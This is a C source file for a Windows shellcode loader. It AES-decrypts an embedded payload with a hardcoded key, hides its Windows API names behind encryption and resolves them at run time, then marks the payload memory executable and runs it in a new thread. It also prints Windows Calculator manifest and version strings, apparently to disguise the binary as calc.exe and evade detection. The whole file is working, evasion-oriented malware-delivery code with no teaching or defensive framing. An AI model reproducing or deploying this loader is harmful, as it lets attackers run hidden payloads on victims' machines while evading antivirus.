#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))                
				return -1;
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
                return -1;
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))
                return -1;              
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey))
                return -1;
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len))
                return -1;
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

unsigned char key[] = { 0xe5, 0x66, 0x24, 0x89, 0x2a, 0xe5, 0x89, 0xef, 0x17, 0x19, 0x9e, 0x73, 0x30, 0x58, 0x42, 0x4e };
unsigned char buf[] = { 0xdb, 0xf7, 0xdb, 0x14, 0x0, 0xb0, 0x34, 0xf6, 0x6, 0xa9, 0xba, 0x4a, 0xb0, 0xd4, 0xe5, 0x65, 0x94, 0xe4, 0x4d, 0x4d, 0x37, 0x19, 0xf4, 0x20, 0xd, 0x51, 0x9b, 0xa2, 0x36, 0xd8, 0x5, 0xcb, 0xf6, 0xed, 0x90, 0x43, 0xd9, 0xf, 0x6d, 0x1b, 0xdf, 0x95, 0x4b, 0x93, 0x8f, 0xbc, 0x1a, 0xf5, 0x8a, 0x90, 0x20, 0x85, 0xbe, 0xe, 0x9e, 0xb7, 0xd9, 0x45, 0x61, 0x53, 0x8d, 0xfc, 0x25, 0x68, 0x40, 0x79, 0x24, 0xaa, 0x5d, 0xe5, 0xaa, 0xcc, 0x66, 0xdd, 0x87, 0xe3, 0x3c, 0x99, 0xbe, 0x4, 0x7e, 0x91, 0xe9, 0xef, 0x9, 0x86, 0x2d, 0xd4, 0x64, 0x56, 0xd5, 0x5a, 0x9c, 0x3e, 0x1a, 0x24, 0x69, 0xd0, 0x7c, 0xba, 0x45, 0xb6, 0xae, 0x66, 0xad, 0x84, 0x28, 0x3, 0xab, 0xa1, 0x59, 0xea, 0xa, 0x62, 0x83, 0x5, 0xd8, 0x46, 0x21, 0xfd, 0x41, 0x1f, 0xae, 0x1c, 0x7, 0xdf, 0x72, 0x8e, 0x37, 0x96, 0xf9, 0x4b, 0xbd, 0xdf, 0x3f, 0x18, 0x37, 0x4b, 0x43, 0x97, 0x94, 0xc2, 0x8d, 0x6, 0x79, 0x2f, 0x47, 0x6, 0xb8, 0x14, 0x27, 0xe5, 0x94, 0x62, 0xd7, 0x4, 0x7e, 0x3d, 0x26, 0x90, 0xba, 0x4b, 0x27, 0x91, 0x92, 0x0, 0xda, 0x59, 0xf4, 0x13, 0xce, 0x54, 0xdf, 0x8, 0xf8, 0x76, 0xd8, 0xfb, 0x9e, 0x4a, 0x45, 0xc8, 0x14, 0xa1, 0xc, 0x97, 0x1f, 0x3a, 0x10, 0xdf, 0x33, 0xf4, 0xf4, 0x36, 0x99, 0x6f, 0xba, 0x9d, 0xb7, 0xf2, 0xd3, 0xb9, 0x70, 0x39, 0xcf, 0x71, 0x1f, 0xe0, 0xbe, 0x33, 0x4f, 0x7, 0x7c, 0x5e, 0x81, 0x55, 0xfd, 0x6, 0x2, 0x97, 0x2d, 0xce, 0x6c, 0x1d, 0x95, 0x8e, 0xaa, 0x96, 0x90, 0xc3, 0x63, 0x24, 0x88, 0x7e, 0x81, 0x61, 0xb9, 0x77, 0x95, 0xc8, 0x2f, 0x6c, 0xc4, 0xb6, 0x92, 0xa6, 0x9a, 0x5d, 0xc8, 0x7a, 0x1e, 0x40, 0x32, 0x99, 0x62, 0x1b, 0xdb, 0xba, 0xed, 0x31, 0x5b, 0x10, 0x43, 0x6c, 0xab, 0xe0, 0x6d, 0x18, 0x1c, 0x16, 0x26, 0xd4, 0xa3, 0x3c, 0xb8, 0x94, 0xa7, 0x11, 0x1a, 0x96, 0x5f, 0x75, 0xdd, 0x4c, 0x9c, 0xce, 0x45, 0x95 };
unsigned int buf_length = sizeof(buf);
unsigned char kern32[] = { 0xdf, 0x62, 0xc5, 0x47, 0xe9, 0xd3, 0xfe, 0x4c, 0xda, 0x52, 0xc0, 0xb6, 0xe1, 0xb2, 0x65, 0x5f };

int wmain(void){

unsigned char calcstrings[] = "IDI_CALC_ICON\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!-- Copyright (c) Microsoft Corporation -->\n<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n<assemblyIdentity\n    name=\"Microsoft.Windows.Shell.calc\"\n    processorArchitecture=\"amd64\"\n    version=\"5.1.0.0\"\n    type=\"win32\"/>\n<description>Windows Shell</description>\n<dependency>\n    <dependentAssembly>\n        <assemblyIdentity\n            type=\"win32\"\n            name=\"Microsoft.Windows.Common-Controls\"\n            version=\"6.0.0.0\"\n            processorArchitecture=\"*\"\n            publicKeyToken=\"6595b64144ccf1df\"\n            language=\"*\"\n        />\n    </dependentAssembly>\n</dependency>\n<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n    <security>\n        <requestedPrivileges>\n            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n    </security>\n</trustInfo>\n<application xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n    <windowsSettings>\n        <dpiAware  xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>\n    </windowsSettings>\n</application>\n</assembly>\ncE?\nStringFileInfo\n040904B0\nCompanyName\nMicrosoft Corporation\nFileDescription\nWindows Calculator\nFileVersion\n10.0.17763.1 (WinBuild.160101.0800)\nInternalName\nCALC\nLegalCopyright\nMicrosoft Corporation. All rights reserved.\nOriginalFilename\nCALC.EXE\nProductName\nMicrosoft\nWindows\n Operating System\nProductVersion\n10.0.17763.1";
printf(calcstrings);

LPVOID exec_payload;
BOOL vp;
PDWORD lpflOldProtect = 0;
HANDLE new_thread;

AESDecrypt(kern32, sizeof(kern32), key, sizeof(key));
kern32[12] = '\0';

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

unsigned char VirtualAllocEnc[] = { 0xae, 0x9a, 0x7a, 0x52, 0x7c, 0xa6, 0xa9, 0x54, 0x86, 0x2a, 0xf, 0x97, 0xca, 0xff, 0xc3, 0x83 };




AESDecrypt(VirtualAllocEnc, sizeof(VirtualAllocEnc), key, sizeof(key));
VirtualAllocEnc[12] = '\0';


pVirtualAlloc = GetProcAddress(GetModuleHandle(kern32), VirtualAllocEnc);


BOOL (WINAPI * pVirtualProtect)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

unsigned char VirtualProtectEnc[] = { 0x3b, 0xcf, 0x1b, 0xf1, 0xd8, 0x16, 0xfe, 0x82, 0xdb, 0xc8, 0x50, 0x34, 0xc6, 0xc1, 0xd4, 0x8f };
AESDecrypt(VirtualProtectEnc, sizeof(VirtualProtectEnc), key, sizeof(key));
VirtualProtectEnc[14] = '\0';
pVirtualProtect = GetProcAddress(GetModuleHandle(kern32), VirtualProtectEnc);



HANDLE (WINAPI * pCreateThread)(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  __drv_aliasesMem LPVOID lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);


unsigned char CreateThreadEnc[] = { 0x26, 0xd0, 0x9e, 0x57, 0x7, 0x4b, 0xcf, 0x96, 0x98, 0x4d, 0xdd, 0x7e, 0xcf, 0x1, 0x25, 0x2b };
AESDecrypt(CreateThreadEnc, sizeof(CreateThreadEnc), key, sizeof(key));
CreateThreadEnc[12] = '\0';
pCreateThread = GetProcAddress(GetModuleHandle(kern32), CreateThreadEnc);


DWORD (WINAPI * pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

unsigned char WaitForSingleObjectEnc[] = { 0x10, 0xd6, 0x4c, 0x9d, 0x95, 0x54, 0xa, 0xf2, 0xb9, 0x10, 0x9a, 0xd4, 0x2e, 0xab, 0x20, 0x59, 0xc6, 0x43, 0xe8, 0x94, 0xd1, 0x7d, 0xe6, 0x8b, 0xf6, 0xa6, 0x7, 0xb7, 0x21, 0xb1, 0x1c, 0x8c };
AESDecrypt(WaitForSingleObjectEnc, sizeof(WaitForSingleObjectEnc), key, sizeof(key));
pWaitForSingleObject = GetProcAddress(GetModuleHandle(kern32), WaitForSingleObjectEnc);



exec_payload = pVirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);



AESDecrypt((char *) buf, buf_length, (char *)key, sizeof(key));


RtlMoveMemory(exec_payload,buf,buf_length);



vp = pVirtualProtect(exec_payload, buf_length, PAGE_EXECUTE_READ, &lpflOldProtect);


    new_thread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
    if (new_thread == NULL)
        exit(-1);
    pWaitForSingleObject(new_thread, -1);

};